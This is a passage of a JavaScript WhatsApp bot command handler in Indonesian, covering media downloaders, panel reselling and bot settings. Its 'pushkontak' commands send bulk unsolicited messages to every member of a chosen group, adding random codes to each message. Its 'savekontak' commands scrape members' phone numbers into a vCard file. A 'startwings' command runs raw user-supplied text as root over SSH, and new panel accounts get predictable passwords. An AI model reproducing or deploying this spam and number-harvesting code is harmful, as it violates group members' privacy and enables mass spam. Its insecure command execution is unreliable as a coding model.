}}, {userJid: m.sender, quoted: m})
await Xzyy.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await Xzyy.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await Xzyy.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
    case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await Xzyy.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break;
///
case "public":
case "self": {
    if (!isCreator) return m.reply(mess.owner);
    let path = require.resolve("./settings.js");
    let data = fs.readFileSync(path, "utf-8");

    if (command === "public") {
        global.mode_public = true;
        Xzyy.public = global.mode_public
        let newData = data.replace(/global\.mode_public\s*=\s*(true|false)/, "global.mode_public = true");
        fs.writeFileSync(path, newData, "utf-8");
        return m.reply("✅ Mode berhasil diubah menjadi *Public*");
    }

    if (command === "self") {
        global.mode_public = false;
        Xzyy.public = global.mode_public
        let newData = data.replace(/global\.mode_public\s*=\s*(true|false)/, "global.mode_public = false");
        fs.writeFileSync(path, newData, "utf-8");
        return m.reply("✅ Mode berhasil diubah menjadi *Self*");
    }
}
break;

case "setjeda": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`*Contoh :*\n${cmd} push 5000\n${cmd} jpm 6000\n\nKeterangan format waktu:\n1 detik = 1000\n\nJeda waktu saat ini:\nJeda Pushkontak > ${global.JedaPushkontak}\nJeda JPM > ${global.JedaJpm}`);

    let args = text.split(" ");
    if (args.length < 2) return m.reply(`*Contoh :*\n${cmd} push 5000\n${cmd} jpm 6000\n\nKeterangan format waktu:\n1 detik = 1000\n\nJeda waktu saat ini:\nJeda Pushkontak > ${global.JedaPushkontak}\nJeda JPM > ${global.JedaJpm}`);

    let target = args[0].toLowerCase(); // push / jpm
    let value = args[1];

    if (isNaN(value)) return m.reply("Harus berupa angka!");
    let jeda = parseInt(value);

    let fs = require("fs");
    let path = require.resolve("./settings.js");
    let data = fs.readFileSync(path, "utf-8");

    if (target === "push") {
        let newData = data.replace(/global\.JedaPushkontak\s*=\s*\d+/, `global.JedaPushkontak = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.JedaPushkontak = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda Push Kontak* menjadi *${jeda}* ms`);
    } 
    
    if (target === "jpm") {
        let newData = data.replace(/global\.JedaJpm\s*=\s*\d+/, `global.JedaJpm = ${jeda}`);
        fs.writeFileSync(path, newData, "utf-8");
        global.JedaJpm = jeda;
        return m.reply(`✅ Berhasil mengubah *Jeda JPM* menjadi *${jeda}* ms`);
    }

    return m.reply(`Pilihan tidak valid!\nGunakan: *push* atau *jpm*`);
}
break;


case "pushkontak": case "puskontak": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`*Contoh :* ${cmd} pesannya`)
global.textpushkontak = text
let rows = []
const a = await Xzyy.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response ${u.id}`
})
}
await Xzyy.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Pushkontak\n`
}, { quoted: m })
}
break

case "pushkontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.textpushkontak) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await Xzyy.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id.includes(".net") ? v.id : v.jid)
    .map(v => v.id.includes(".net") ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await m.reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);
  
  global.statuspush = true
  
 delete global.textpushkontak
 let count = 0
 
  for (const mem of halls) {
    if (global.stoppush) {
    delete global.stoppush
    delete global.statuspush
    break
    }
    await Xzyy.sendMessage(mem, { text: teks }, { quoted: FakeChannel });
    await global.sleep(global.JedaPushkontak);
    count += 1
  }
  
  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${count}* member.`, jidawal)
}
break

case "pushkontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.textpushkontak) return m.reply(`Data teks pushkontak tidak ditemukan!\nSilahkan ketik *.pushkontak* pesannya`);
  
  const teks = global.textpushkontak
  const jidawal = m.chat
  const data = await Xzyy.groupMetadata(text)
  const halls = data.participants
    .filter(v => v.id.includes(".net") ? v.id : v.jid)
    .map(v => v.id.includes(".net") ? v.id : v.jid)
    .filter(id => id !== botNumber && id.split("@")[0] !== global.owner); 

  await m.reply(`🚀 Memulai pushkontak ke dalam grup ${data.subject} dengan total member ${halls.length}`);
  
  global.statuspush = true
  delete global.textpushkontak
  let count = 0

  // fungsi random kode
  function randomKode(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    let result = ''
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return result
  }
 
  for (const mem of halls) {
    if (global.stoppush) {
      delete global.stoppush
      delete global.statuspush
      break
    }

    // bikin kode baru tiap kirim
    let kodeUnik = randomKode(6)
    let pesan = `${teks}\n\nKode unik: #${kodeUnik}`

    await Xzyy.sendMessage(mem, { text: pesan }, { quoted: FakeChannel });
    await global.sleep(global.JedaPushkontak);
    count += 1
  }
  
  delete global.statuspush
  await m.reply(`✅ Sukses pushkontak!\nPesan berhasil dikirim ke *${count}* member.`, jidawal)
}
break

case "pushkontak2": case "puskontak2": {
if (!isCreator) return m.reply(mess.owner)
if (!text || !text.includes("|")) return m.reply(`Masukan pesan & nama kontak\n*Contoh :* ${cmd} pesan|namakontak`)
global.textpushkontak = text.split("|")[0]
let rows = []
const a = await Xzyy.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.pushkontak-response2 ${u.id}|${text.split("|")[1]}`
})
}
await Xzyy.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup PushkontakV2\n`
}, { quoted: m })
}
break

case "startwings": case "configurewings": {
if (!isCreator) return m.reply(mess.owner)
let t = text.split('|')
if (t.length < 3) return m.reply(example("ipvps|pwvps|token_node"))

let ipvps = t[0]
let passwd = t[1]
let token = t[2]

const XzyySettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `${token} && systemctl start wings`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("*Berhasil menjalankan wings ✅*\n* Status wings : *aktif*")
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("y\n")
stream.write("systemctl start wings\n")
m.reply('STDERR: ' + data);
});
});
}).on('error', (err) => {
console.log('connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(XzyySettings);
}
break


case "savenomor":
case "sv":
case "save": {
    if (!isCreator) return m.reply(mess.owner)

    let nomor, nama

    if (m.isGroup) {
        if (!text) return m.reply(`*Contoh penggunaan di grup:*\n${cmd} @tag|nama\natau reply target dengan:\n${cmd} nama`)

        // Jika ada tag
        if (m.mentionedJid[0]) {
            nomor = m.mentionedJid[0]
            nama = text.split("|")[1]?.trim()
            if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* ${cmd} @tag|nama`)
        } 
        // Jika reply
        else if (m.quoted) {
            nomor = m.quoted.sender
            nama = text.trim()
        } 
        // Jika input manual nomor
        else if (/^\d+$/.test(text.split("|")[0])) {
            nomor = text.split("|")[0].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
            nama = text.split("|")[1]?.trim()
            if (!nama) return m.reply(`Harap tulis nama setelah "|"\n*Contoh:* ${cmd} 628xxxx|nama`)
        } 
        else {
            return m.reply(`*Contoh penggunaan di grup:*\n${cmd} @tag|nama\natau reply target dengan:\n${cmd} nama`)
        }
    } else {
        // Private chat hanya nama
        if (!text) return m.reply(`*Contoh penggunaan di private:*\n${cmd} nama`)
        nomor = m.chat
        nama = text.trim()
    }

    const contactAction = {
        "fullName": nama,
        "lidJid": nomor,
        "saveOnPrimaryAddressbook": true
    };

    await Xzyy.addOrEditContact(nomor, contactAction);

    return m.reply(`✅ Berhasil menyimpan kontak

- Nomor: ${nomor.split("@")[0]}
- Nama: ${nama}`)
}
break

case "savekontak": case "svkontak": {
if (!isCreator) return m.reply(mess.owner)
if (!text) return m.reply(`Masukan namakontak\n*Contoh :* ${cmd} afiqofficial`)
global.namakontak = text
let rows = []
const a = await Xzyy.groupFetchAllParticipating()
if (a.length < 1) return m.reply("Tidak ada grup chat.")
const Data = Object.values(a)
let number = 0
for (let u of Data) {
const name = u.subject || "Unknown"
rows.push({
title: name,
description: `Total Member: ${u.participants.length}`, 
id: `.savekontak-response ${u.id}`
})
}
await Xzyy.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Target Grup Savekontak\n`
}, { quoted: m })
}
break

case "savekontak-response": {
  if (!isCreator) return m.reply(mess.owner)
  if (!global.namakontak) return m.reply(`Data nama savekontak tidak ditemukan!\nSilahkan ketik *.savekontak* namakontak`);
  try {
    const res = await Xzyy.groupMetadata(text)
    const halls = res.participants
      .filter(v => v.id.includes(".net") ? v.id : v.jid.endsWith('.net'))
      .map(v => v.id.includes(".net") ? v.id : v.jid)
      .filter(id => id !== botNumber && id.split("@")[0] !== global.owner)

    if (!halls.length) return m.reply("Tidak ada kontak yang bisa disimpan.")
    let names = text
    const existingContacts = JSON.parse(fs.readFileSync('./Data/contacts.json', 'utf8') || '[]')
    const newContacts = [...new Set([...existingContacts, ...halls])]

    fs.writeFileSync('./Data/contacts.json', JSON.stringify(newContacts, null, 2))

    // Buat file .vcf
    const vcardContent = newContacts.map(contact => {
      const phone = contact.split("@")[0]
      return [
        "BEGIN:VCARD",
        "VERSION:3.0",
        `FN:${global.namakontak} - ${phone}`,
        `TEL;type=CELL;type=VOICE;waid=${phone}:+${phone}`,
        "END:VCARD",
        ""
      ].join("\n")
    }).join("")

    fs.writeFileSync("./Data/contacts.vcf", vcardContent, "utf8")

    // Kirim ke private chat
    if (m.chat !== m.sender) {
      await m.reply(`Berhasil membuat file kontak dari grup ${res.subject}\n\nFile kontak telah dikirim ke private chat\nTotal ${halls.length} kontak`)
    }

    await Xzyy.sendMessage(
      m.sender,
      {
        document: fs.readFileSync("./Data/contacts.vcf"),
        fileName: "contacts.vcf",
        caption: `File kontak berhasil dibuat ✅\nTotal ${halls.length} kontak`,
        mimetype: "text/vcard",
      },
      { quoted: m }
    )
    
    delete global.namakontak

    fs.writeFileSync("./Data/contacts.json", "[]")
    fs.writeFileSync("./Data/contacts.vcf", "")

  } catch (err) {
    m.reply("Terjadi kesalahan saat menyimpan kontak:\n" + err.toString())
  }
}
break

case "stopjpm": {
if (!isCreator) return m.reply(mess.owner)
if (!global.statusjpm) return m.reply("Jpm sedang tidak berjalan!")
global.stopjpm = true
return m.reply("Berhasil menghentikan jpm ✅")
}
break

case "stoppushkontak": case "stoppush": case "stoppus": {
if (!isCreator) return m.reply(mess.owner)
if (!global.statuspush) return m.reply("Pushkontak sedang tidak berjalan!")
global.stoppush = true
return m.reply("Berhasil menghentikan pushkontak ✅")
}
break

case "1gb": case "2gb": case "3gb": case "4gb": case "5gb": 
case "6gb": case "7gb": case "8gb": case "9gb": case "10gb": 
case "unlimited": case "unli": {
    if (!isCreator && !isReseller) {
        return m.reply(`Fitur ini untuk di dalam grup reseller panel`);
    }
    if (!text) return m.reply(`*Contoh :* ${cmd} username,6283XXX`)

    let nomor, usernem;
    let tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek.map(t => t.trim());
        if (!users || !nom) return m.reply(`*Contoh :* ${cmd} username,6283XXX`)
        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat
    }

    try {
        var onWa = await Xzyy.onWhatsApp(nomor.split("@")[0]);
        if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");
    } catch (err) {
        return m.reply("Terjadi kesalahan saat mengecek nomor WhatsApp: " + err.message);
    }

    // Mapping RAM, Disk, dan CPU
    const resourceMap = {
        "1gb": { ram: "1000", disk: "1000", cpu: "40" },
        "2gb": { ram: "2000", disk: "1000", cpu: "60" },
        "3gb": { ram: "3000", disk: "2000", cpu: "80" },
        "4gb": { ram: "4000", disk: "2000", cpu: "100" },
        "5gb": { ram: "5000", disk: "3000", cpu: "120" },
        "6gb": { ram: "6000", disk: "3000", cpu: "140" },
        "7gb": { ram: "7000", disk: "4000", cpu: "160" },
        "8gb": { ram: "8000", disk: "4000", cpu: "180" },
        "9gb": { ram: "9000", disk: "5000", cpu: "200" },
        "10gb": { ram: "10000", disk: "5000", cpu: "220" },
        "unlimited": { ram: "0", disk: "0", cpu: "0" }
    };
    
    let { ram, disk, cpu } = resourceMap[command] || { ram: "0", disk: "0", cpu: "0" };

    let username = usernem.toLowerCase();
    let email = username + "@gmail.com";
    let name = global.capital(username) + " Server";
    let password = username + "001";

    try {
        let f = await fetch(domain + "/api/application/users", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({ email, username, first_name: name, last_name: "Server", language: "en", password })
        });
        let data = await f.json();
        if (data.errors) return m.reply("Error: " + JSON.stringify(data.errors[0], null, 2));
        let user = data.attributes;

        let f1 = await fetch(domain + `/api/application/nests/${nestid}/eggs/` + egg, {
            method: "GET",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey }
        });
        let data2 = await f1.json();
        let startup_cmd = data2.attributes.startup;

        let f2 = await fetch(domain + "/api/application/servers", {
            method: "POST",
            headers: { "Accept": "application/json", "Content-Type": "application/json", "Authorization": "Bearer " + apikey },
            body: JSON.stringify({
                name,
                description: global.tanggal(Date.now()),
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                startup: startup_cmd,
                environment: { INST: "npm", USER_UPLOAD: "0", AUTO_UPDATE: "0", CMD_RUN: "npm start" },
                limits: { memory: ram, swap: 0, disk, io: 500, cpu },
                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                deploy: { locations: [parseInt(loc)], dedicated_ip: false, port_range: [] },
            })
        });
        let result = await f2.json();
        if (result.errors) return m.reply("Error: " + JSON.stringify(result.errors[0], null, 2));
        
        let server = result.attributes;
        var orang = nomor
        if (orang !== m.chat) {
        await m.reply(`Berhasil membuat akun panel ✅\ndata akun terkirim ke nomor ${nomor.split("@")[0]}`)
        }

let teks = `
*Berikut detail akun panel kamu 📦*

📡 Server ID: ${server.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}

*⚙️ Spesifikasi server panel*
- RAM: ${ram == "0" ? "Unlimited" : ram / 1000 + "GB"}
- Disk: ${disk == "0" ? "Unlimited" : disk / 1000 + "GB"}
- CPU: ${cpu == "0" ? "Unlimited" : cpu + "%"}
- Panel: ${global.domain}

*Rules pembelian panel :*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
`
        await Xzyy.sendMessage(orang, { text: teks }, { quoted: m });
    } catch (err) {
        return m.reply("Terjadi kesalahan: " + err.message);
    }
}
break

case "delpanel": {
    if (!isCreator && !isReseller) {
        return m.reply(mess.owner);
    }
    const rows = []
    rows.push({
title: `Hapus Semua`,
description: `Hapus semua server panel`, 
id: `.delpanel-all`
})            
    try {
        const response = await fetch(`${domain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return m.reply("Tidak ada server panel!");
        }

        let messageText = `\n*Total server panel :* ${servers.length}\n`

        for (const server of servers) {
            const s = server.attributes;

            const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${capikey}`,
                },
            });

            const statusData = await resStatus.json();

            const ram = s.limits.memory === 0
                ? "Unlimited"
                : s.limits.memory >= 1024
                ? `${Math.floor(s.limits.memory / 1024)} GB`
                : `${s.limits.memory} MB`;

            const disk = s.limits.disk === 0
                ? "Unlimited"
                : s.limits.disk >= 1024
                ? `${Math.floor(s.limits.disk / 1024)} GB`
                : `${s.limits.disk} MB`;

            const cpu = s.limits.cpu === 0
                ? "Unlimited"
                : `${s.limits.cpu}%`;
            rows.push({
title: `${s.name} || ID:${s.id}`,
description: `Ram ${ram} || Disk ${disk} || CPU ${cpu}`, 
id: `.delpanel-response ${s.id}`
})            
        }                  
        await Xzyy.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Server Panel',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Server Panel Yang Ingin Dihapus\n`
}, { quoted: m })

    } catch (err) {
        console.error("Error listing panel servers:", err);
        m.reply("Terjadi kesalahan saat mengambil data server.");
    }
}
break;

case "delpanel-response": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return 
    
    try {
        const serverResponse = await fetch(domain + "/api/application/servers", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const serverData = await serverResponse.json();
        const servers = serverData.data;
        
        let serverName;
        let serverSection;
        let serverFound = false;
        
        for (const server of servers) {
            const serverAttr = server.attributes;
            
            if (Number(text) === serverAttr.id) {
                serverSection = serverAttr.name.toLowerCase();
                serverName = serverAttr.name;
                serverFound = true;
                
                const deleteServerResponse = await fetch(domain + `/api/application/servers/${serverAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteServerResponse.ok) {
                    const errorData = await deleteServerResponse.json();
                    console.error("Gagal menghapus server:", errorData);
                }
                
                break;
            }
        }
        
        if (!serverFound) {
            return m.reply("Gagal menghapus server!\nID server tidak ditemukan");
        }
        
        const userResponse = await fetch(domain + "/api/application/users", {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": "Bearer " + apikey
            }
        });
        const userData = await userResponse.json();
        const users = userData.data;
        
        for (const user of users) {
            const userAttr = user.attributes;
            
            if (userAttr.first_name.toLowerCase() === serverSection) {
                const deleteUserResponse = await fetch(domain + `/api/application/users/${userAttr.id}`, {
                    method: "DELETE",
                    headers: {
                        "Accept": "application/json",
                        "Content-Type": "application/json",
                        "Authorization": "Bearer " + apikey
                    }
                });
                
                if (!deleteUserResponse.ok) {
                    const errorData = await deleteUserResponse.json();
                    console.error("Gagal menghapus user:", errorData);
                }
                
                break;
            }
        }
        
        await m.reply(`Barhasil Menghapus Sever Panel ✅\nNama Server: ${capital(serverName)}`);
        
    } catch (error) {
        console.error("Error dalam proses delpanel:", error);
        await m.reply("Terjadi kesalahan saat memproses permintaan");
    }
}
break;

case "delpanel-all": {
if (!isCreator) return m.reply(mess.owner)
await m.reply(`Memproses penghapusan semua user & server panel yang bukan admin`)
try {
const PTERO_URL = global.domain
// Ganti dengan URL panel Pterodactyl
const API_KEY = global.apikey// API Key dengan akses admin

// Konfigurasi headers
const headers = {
  "Authorization": "Bearer " + API_KEY,
  "Content-Type": "application/json",
  "Accept": "application/json",
};

// Fungsi untuk mendapatkan semua user
async function getUsers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/users`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    
    return [];
  }
}

// Fungsi untuk mendapatkan semua server
async function getServers() {
  try {
    const res = await axios.get(`${PTERO_URL}/api/application/servers`, { headers });
    return res.data.data;
  } catch (error) {
    m.reply(JSON.stringify(error.response?.data || error.message, null, 2))
    return [];
  }
}

// Fungsi untuk menghapus server berdasarkan UUID
async function deleteServer(serverUUID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/servers/${serverUUID}`, { headers });
    console.log(`Server ${serverUUID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus server ${serverUUID}:`, error.response?.data || error.message);
  }
}

// Fungsi untuk menghapus user berdasarkan ID
async function deleteUser(userID) {
  try {
    await axios.delete(`${PTERO_URL}/api/application/users/${userID}`, { headers });
    console.log(`User ${userID} berhasil dihapus.`);
  } catch (error) {
    console.error(`Gagal menghapus user ${userID}:`, error.response?.data || error.message);
  }
}

// Fungsi utama untuk menghapus semua user & server yang bukan admin
async function deleteNonAdminUsersAndServers() {
  const users = await getUsers();
  const servers = await getServers();
  let totalSrv = 0

  for (const user of users) {
    if (user.attributes.root_admin) {
      console.log(`Lewati admin: ${user.attributes.username}`);
      continue; // Lewati admin
    }

    const userID = user.attributes.id;
    const userEmail = user.attributes.email;

    console.log(`Menghapus user: ${user.attributes.username} (${userEmail})`);

    // Cari server yang dimiliki user ini
    const userServers = servers.filter(srv => srv.attributes.user === userID);

    // Hapus semua server user ini
    for (const server of userServers) {
      await deleteServer(server.attributes.id);
      totalSrv += 1
    }

    // Hapus user setelah semua servernya terhapus
    await deleteUser(userID);
  }
await m.reply(`Berhasil menghapus ${totalSrv} user & server panel yang bukan admin.`)
}

// Jalankan fungsi
return deleteNonAdminUsersAndServers();
} catch (err) {
return m.reply(`${JSON.stringify(err, null, 2)}`)
}
}
break

case "listpanel":
case "listserver": {
    if (!isCreator && !isReseller) {
        return m.reply(`Fitur ini hanya untuk di dalam grup reseller panel`);
    }

    try {
        const response = await fetch(`${domain}/api/application/servers`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`,
            },
        });

        const result = await response.json();
        const servers = result.data;

        if (!servers || servers.length === 0) {
            return m.reply("Tidak ada server panel!");
        }

        let messageText = `\n*Total server panel :* ${servers.length}\n`

        for (const server of servers) {
            const s = server.attributes;

            const resStatus = await fetch(`${domain}/api/client/servers/${s.uuid.split("-")[0]}/resources`, {
                method: "GET",
                headers: {
                    Accept: "application/json",
                    "Content-Type": "application/json",
                    Authorization: `Bearer ${capikey}`,
                },
            });

            const statusData = await resStatus.json();

            const ram = s.limits.memory === 0
                ? "Unlimited"
                : s.limits.memory >= 1024
                ? `${Math.floor(s.limits.memory / 1024)} GB`
                : `${s.limits.memory} MB`;

            const disk = s.limits.disk === 0
                ? "Unlimited"
                : s.limits.disk >= 1024
                ? `${Math.floor(s.limits.disk / 1024)} GB`
                : `${s.limits.disk} MB`;

            const cpu = s.limits.cpu === 0
                ? "Unlimited"
                : `${s.limits.cpu}%`;

            messageText += `
- ID : *${s.id}*
- Nama Server : *${s.name}*
- Ram : *${ram}*
- Disk : *${disk}*
- CPU : *${cpu}*
- Created : *${s.created_at.split("T")[0]}*\n`;
        }                  
        await m.reply(messageText)

    } catch (err) {
        console.error("Error listing panel servers:", err);
        m.reply("Terjadi kesalahan saat mengambil data server.");
    }
}
break;

case "cadmin": {
    if (!isCreator) return m.reply(mess.owner);
    if (!text) return m.reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)
    let nomor, usernem;
    const tek = text.split(",");
    if (tek.length > 1) {
        let [users, nom] = tek;
        if (!users || !nom) return m.reply(`Masukan username & nomor (opsional)\n*contoh:* ${cmd} skyzopedia,628XXX`)

        nomor = nom.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
        usernem = users.toLowerCase();
    } else {
        usernem = text.toLowerCase();
        nomor = m.isGroup ? m.sender : m.chat;
    }

    const onWa = await Xzyy.onWhatsApp(nomor.split("@")[0]);
    if (onWa.length < 1) return m.reply("Nomor target tidak terdaftar di WhatsApp!");

    const username = usernem.toLowerCase();
    const email = `${username}@gmail.com`;
    const name = global.capital(args[0]);
    const password = `${username}001`;

    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: name,
                last_name: "Admin",
                root_admin: true,
                language: "en",
                password
            })
        });

        const data = await res.json();
        if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));

        const user = data.attributes;
        const orang = nomor;

        if (nomor !== m.chat) {
            await m.reply(`Berhasil membuat akun admin panel ✅\nData akun terkirim ke nomor ${nomor.split("@")[0]}`);
        }

        const teks = `
*Berikut detail akun admin panel 📦*

📡 Server ID: ${user.id}
👤 Username: \`${user.username}\`
🔐 Password: \`${password}\`
🗓️ Tanggal Aktivasi: ${global.tanggal(Date.now())}
*🌐* ${global.domain}

*Rules pembelian admin panel:*  
- Masa aktif 30 hari  
- Data bersifat pribadi, mohon disimpan dengan aman  
- Garansi berlaku 15 hari (1x replace)  
- Klaim garansi wajib menyertakan *bukti chat pembelian*
        `;

        await Xzyy.sendMessage(orang, { text: teks }, { quoted: m });

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat membuat akun admin panel.");
    }
}
break;

case "deladmin": {
    if (!isCreator) return m.reply(mess.owner);
    try {
        const res = await fetch(`${domain}/api/application/users`, {
            method: "GET",
            headers: {
                Accept: "application/json",
                "Content-Type": "application/json",
                Authorization: `Bearer ${apikey}`
            }
        });
        const rows = []
        const data = await res.json();
        const users = data.data;

        const adminUsers = users.filter(u => u.attributes.root_admin === true);
        if (adminUsers.length < 1) return m.reply("Tidak ada admin panel.");

        let teks = `\n*Total admin panel :* ${adminUsers.length}\n`
        adminUsers.forEach((admin, idx) => {
            teks += `
- ID : *${admin.attributes.id}*
- Nama : *${admin.attributes.first_name}*
- Created : ${admin.attributes.created_at.split("T")[0]}
`;
rows.push({
title: `${admin.attributes.first_name} || ID:${admin.attributes.id}`,
description: `Created At: ${admin.attributes.created_at.split("T")[0]}`, 
id: `.deladmin-response ${admin.attributes.id}`
})            
        });

        await Xzyy.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Admin Panel',
          sections: [
            {
              title: `© Powered By ${namaOwner}`,
              rows: rows
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: `\nPilih Admin Panel Yang Ingin Dihapus\n`
}, { quoted: m })

    } catch (err) {
        console.error(err);
        m.reply("Terjadi kesalahan saat mengambil data admin.");
    }
}
break;

case "opn": {
    try {
        const fs = require("fs");
        const keysFile = "./Data/keys.json";
        const devFile = "./Data/developer.json";

        // baca isi file keys.json & developer.json
        let keys = fs.existsSync(keysFile) ? JSON.parse(fs.readFileSync(keysFile)) : [];
        let Own = fs.existsSync(devFile) ? JSON.parse(fs.readFileSync(devFile)) : [];

        // ambil key dari input
        const token = text?.trim();
        if (!token) return m.reply(`⚠️ Masukkan *key valid*.\n\nContoh:\n.opn <key>`);

        // cari key yang cocok
        const keyIndex = keys.findIndex(k => k.token === token);
        if (keyIndex === -1) return m.reply(`❌ Key tidak ditemukan.`);
        if (keys[keyIndex].used) return m.reply(`⚠️ Key sudah pernah digunakan.`);

        // ambil pengirim otomatis (quoted > mentioned > sender)
        const input = 
            (m.quoted && m.quoted.sender) ||
